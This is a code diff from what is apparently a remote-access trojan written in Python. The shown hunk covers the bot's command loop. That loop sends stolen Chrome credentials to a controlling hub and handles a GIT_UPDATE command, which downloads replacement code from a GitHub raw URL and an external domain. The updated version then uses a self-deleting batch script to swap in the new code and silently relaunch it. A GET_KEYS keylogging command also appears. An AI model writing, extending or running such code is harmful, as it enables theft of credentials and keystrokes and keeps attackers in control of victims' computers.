@@ -940,30 +940,28 @@ def connect_to_hub(hub_ip, port):
                         send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt')
                     elif command == 'GIT_UPDATE':
                         import requests
-                        # List of mirror links in case one 404s
-                        mirrors = [
-                            "https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py",
-                            "https://raw.githubusercontent.com/ShahDaraza/TestBot/refs/heads/main/python2.py",
-                            "http://zenithintercontinental.site/updates/python2.py"  # Your own domain fallback
-                        ]
-                        
-                        success = False
-                        for url in mirrors:
-                            try:
-                                r = requests.get(url, timeout=5)
-                                if r.status_code == 200:
-                                    with open(os.path.realpath(sys.argv[0]), "w", encoding="utf-8") as f:
-                                        f.write(r.text)
-                                    success = True
-                                    break
-                            except:
-                                continue
-
-                        if success:
-                            send_atomic_data(client, 'LOG', 'Evolution_Complete', 'log.txt')
-                            os.execv(sys.executable, [sys.executable] + sys.argv)
-                        else:
-                            send_atomic_data(client, 'ERROR', 'Update_Failed', 'err.txt')
+                        # The 'Safe' URL that we know works
+                        url = "https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py"
+                        try:
+                            r = requests.get(url, timeout=10)
+                            if r.status_code == 200:
+                                # Write to a TEMPORARY file first to avoid 'File in Use' errors
+                                temp_path = os.path.realpath(sys.argv[0]) + ".tmp"
+                                with open(temp_path, "w", encoding="utf-8") as f:
+                                    f.write(r.text)
+                                
+                                # Create a small batch script to swap the files and restart
+                                swapper = os.path.join(os.getenv('TEMP'), "swap.bat")
+                                with open(swapper, "w") as f:
+                                    f.write(f'timeout /t 2 >nul\nmove /y "{temp_path}" "{os.path.realpath(sys.argv[0])}"\nstart pythonw.exe "{os.path.realpath(sys.argv[0])}"\ndel "%~f0"')
+                                
+                                send_atomic_data(client, 'LOG', 'Swapper_Initiated', 'log.txt')
+                                subprocess.Popen([swapper], shell=True)
+                                sys.exit()  # Exit so the batch file can move the file
+                            else:
+                                send_atomic_data(client, 'ERROR', f'HTTP_Error_{r.status_code}', 'err.txt')
+                        except Exception as e:
+                            send_atomic_data(client, 'ERROR', str(e), 'err.txt')
                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
                             client.sendall(b'DEPENDENCY_MISSING: pynput\n')
